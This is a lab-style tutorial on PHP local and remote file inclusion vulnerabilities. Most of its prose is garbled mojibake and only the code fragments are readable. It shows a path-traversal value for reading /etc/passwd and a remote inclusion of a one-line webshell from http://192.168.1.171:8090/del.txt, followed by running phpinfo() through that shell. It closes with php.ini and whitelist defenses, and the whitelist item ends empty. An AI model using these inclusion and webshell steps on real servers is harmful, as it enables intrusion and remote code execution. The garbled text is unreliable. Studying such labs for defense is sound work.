File Inclusionж–Үд»¶еҢ…еҗ«жјҸжҙһ

еҸ‘иЎЁдәҺ2024-03-02|жӣҙж–°дәҺ2024-03-03
|йҳ…иҜ»йҮҸ:

дёҖ.ж–Үд»¶еҢ…еҗ«жјҸжҙһжҰӮиҝ°

ж–Үд»¶еҢ…еҗ«пјҢжҳҜдёҖдёӘеҠҹиғҪгҖӮеңЁеҗ„з§ҚејҖеҸ‘иҜӯиЁҖдёӯйғҪжҸҗдҫӣдәҶеҶ…зҪ®зҡ„ж–Үд»¶еҢ…еҗ«еҮҪж•°пјҢе…¶еҸҜд»ҘдҪҝејҖеҸ‘дәәе‘ҳеңЁдёҖдёӘд»Јз Ғж–Үд»¶дёӯзӣҙжҺҘеҢ…еҗ«пјҲеј•е…ҘпјүеҸҰеӨ–дёҖдёӘд»Јз Ғж–Үд»¶гҖӮ жҜ”еҰӮ еңЁPHPдёӯпјҢжҸҗдҫӣдәҶпјҡ

  • include(),include_once() includeеҚідҪҝеҢ…еҗ«ж–Үд»¶еҸ‘з”ҹиҜӯжі•й”ҷиҜҜд№ҹдјҡз»§з»ӯжү§иЎҢ
  • require(),require_once() requireеҪ“ж–Үд»¶еҸ‘з”ҹиҜӯжі•й”ҷиҜҜж—¶еҒңжӯўжү§иЎҢ

еӨ§еӨҡж•°жғ…еҶөдёӢпјҢж–Үд»¶еҢ…еҗ«еҮҪж•°дёӯеҢ…еҗ«зҡ„д»Јз Ғж–Үд»¶жҳҜеӣәе®ҡзҡ„пјҢеӣ жӯӨд№ҹдёҚдјҡеҮәзҺ°е®үе…Ёй—®йўҳгҖӮ дҪҶжҳҜпјҢжңүдәӣж—¶еҖҷпјҢж–Үд»¶еҢ…еҗ«зҡ„д»Јз Ғж–Үд»¶иў«еҶҷжҲҗдәҶдёҖдёӘеҸҳйҮҸпјҢдё”иҝҷдёӘеҸҳ йҮҸеҸҜд»Ҙз”ұеүҚз«Ҝз”ЁжҲ·дј иҝӣжқҘпјҢиҝҷз§Қжғ…еҶөдёӢпјҢеҰӮжһңжІЎжңүеҒҡи¶іеӨҹзҡ„е®үе…ЁиҖғиҷ‘пјҢеҲҷеҸҜиғҪдјҡеј•еҸ‘ж–Үд»¶еҢ…еҗ«жјҸжҙһгҖӮ ж”»еҮ»зқҖдјҡжҢҮе®ҡдёҖдёӘвҖңж„ҸжғідёҚеҲ°вҖқзҡ„ж–Үд»¶и®©еҢ…еҗ«еҮҪж•°еҺ»жү§иЎҢпјҢ д»ҺиҖҢйҖ жҲҗжҒ¶ж„Ҹж“ҚдҪңгҖӮ ж №жҚ®дёҚеҗҢзҡ„й…ҚзҪ®зҺҜеўғпјҢж–Үд»¶еҢ…еҗ«жјҸжҙһеҲҶдёәеҰӮдёӢдёӨз§Қжғ…еҶөпјҡ

  1. жң¬ең°ж–Үд»¶еҢ…еҗ«жјҸжҙһпјҡд»…иғҪеӨҹеҜ№жңҚеҠЎеҷЁжң¬ең°зҡ„ж–Үд»¶иҝӣиЎҢеҢ…еҗ«пјҢз”ұдәҺжңҚеҠЎеҷЁдёҠзҡ„ж–Үд»¶е№¶дёҚжҳҜж”»еҮ»иҖ…жүҖиғҪеӨҹжҺ§еҲ¶зҡ„пјҢеӣ жӯӨиҜҘжғ…еҶөдёӢпјҢж”»еҮ»зқҖжӣҙеӨҡзҡ„дјҡеҢ…еҗ«дёҖдәӣ еӣәе®ҡзҡ„зі»з»ҹй…ҚзҪ®ж–Үд»¶пјҢд»ҺиҖҢиҜ»еҸ–зі»з»ҹж•Ҹж„ҹдҝЎжҒҜгҖӮеҫҲеӨҡж—¶еҖҷжң¬ең°ж–Үд»¶еҢ…еҗ«жјҸжҙһдјҡз»“еҗҲдёҖдәӣзү№ж®Ҡзҡ„ж–Үд»¶дёҠдј жјҸжҙһпјҢд»ҺиҖҢеҪўжҲҗжӣҙеӨ§зҡ„еЁҒеҠӣгҖӮ
  2. иҝңзЁӢж–Үд»¶еҢ…еҗ«жјҸжҙһпјҡиғҪеӨҹйҖҡиҝҮurlең°еқҖеҜ№иҝңзЁӢзҡ„ж–Үд»¶иҝӣиЎҢеҢ…еҗ«пјҢиҝҷж„Ҹе‘ізқҖж”»еҮ»иҖ…еҸҜд»Ҙдј е…Ҙд»»ж„Ҹзҡ„д»Јз ҒпјҢиҝҷз§Қжғ…еҶөжІЎе•ҘеҘҪиҜҙзҡ„пјҢеҮҶеӨҮжҢӮеҪ©гҖӮ

еӣ жӯӨпјҢеңЁwebеә”з”Ёзі»з»ҹзҡ„еҠҹиғҪи®ҫи®ЎдёҠе°ҪйҮҸдёҚиҰҒи®©еүҚз«Ҝз”ЁжҲ·зӣҙжҺҘдј еҸҳйҮҸз»ҷеҢ…еҗ«еҮҪж•°пјҢеҰӮжһңйқһиҰҒиҝҷд№ҲеҒҡпјҢд№ҹдёҖе®ҡиҰҒеҒҡдёҘж јзҡ„зҷҪеҗҚеҚ•зӯ–з•ҘиҝӣиЎҢиҝҮж»ӨгҖӮ

дҪ еҸҜд»ҘйҖҡиҝҮвҖңFile InclusionвҖқеҜ№еә”зҡ„жөӢиҜ•ж Ҹзӣ®пјҢжқҘиҝӣдёҖжӯҘзҡ„дәҶи§ЈиҜҘжјҸжҙһгҖӮ

дәҢ.жң¬ең°ж–Үд»¶еҢ…еҗ«жөӢиҜ•

  • йҡҸдҫҝйҖүжӢ©дёҖдёӘkobeжҸҗдәӨеҗҺеҸҜд»ҘеҸ‘зҺ°,иҜҘиЎЁеҚ•дҪҝз”ЁgetжҸҗдәӨз»ҷеҗҺеҸ°дёҖдёӘеҸҳйҮҸfilename=file1.php,еҸҳйҮҸеҖјдёәеүҚз«Ҝи®ҫи®ЎеҘҪзҡ„file1.php

  • дҝ®ж”№еҸҳйҮҸfilenameзҡ„еҖјдёә../../../../../../../etc/passwd ,дҪҝз”Ё../еӨҡж¬Ўи·іиҪ¬и·Ҝеҫ„еҲ°linuxж №и·Ҝеҫ„,д»ҘдҫҝеҢ…еҗ«passwordж–Үд»¶

  • жҹҘзңӢжәҗз ҒеҸҜд»ҘеҸ‘зҺ°еҸҳйҮҸдј иҝӣжқҘзӣҙжҺҘеҢ…еҗ«,жІЎеҒҡд»»дҪ•зҡ„е®үе…ЁйҷҗеҲ¶,е°ұзӣҙжҺҘдҪҝз”ЁincludeеҢ…еҗ«

дёү.иҝңзЁӢж–Үд»¶еҢ…еҗ«жөӢиҜ•

  • еҪ“php.iniдёӯзҡ„allow_url_includeдёәonж—¶phpеҸҜд»ҘеҗҢиҝҮurlжқҘиҝңзЁӢеҢ…еҗ«ж–Үд»¶

  • е…ҲеҲӣе»әиҝңз«ҜзҪ‘зӮ№,del.txt(дёҖеҸҘиҜқжңЁй©¬)

  • дҝ®ж”№еҸҳйҮҸfilenameзҡ„еҖјдёәhttp://192.168.1.171:8090/del.txt,еҸҜд»ҘеҸ‘зҺ°еҗҺз«Ҝж–°е»әдәҶnewFile.php

  • и®ҝй—®newFile.phpйҖҡиҝҮgteдј йҖ’123=phpinfo(); жқҘиҝңзЁӢжү§иЎҢphpд»Јз Ғ

еӣӣ.ж–Үд»¶еҢ…еҗ«жјҸжҙһзҡ„йҳІиҢғ

  1. еңЁеҠҹиғҪи®ҫи®ЎдёҠе°ҪйҮҸдёҚиҰҒе°Ҷж–Үд»¶еҢ…еҗ«еҮҪж•°еҜ№еә”зҡ„ж–Үд»¶ж”ҫз»ҷеүҚз«ҜиҝӣиЎҢйҖүжӢ©е’Ңж“ҚдҪңгҖӮ

  2. иҝҮж»Өжҙӣз§Қ/./,http/,https:/

  3. й…ҚзҪ®php.iniй…ҚзҪ®ж–Үд»¶пјҡ

    • allow_url_fopen off

    • Allow_url_include=off

    • magic_quotes_gpc=on//gpc

  4. йҖҡиҝҮзҷҪеҗҚеҚ•зӯ–з•ҘпјҢд»…е…Ғи®ёеҢ…еҗ«иҝҗиЎҢжҢҮе®ҡзҡ„ж–Үд»¶пјҢе…¶д»–зҡ„йғҪзҰҒжӯўпјҡ
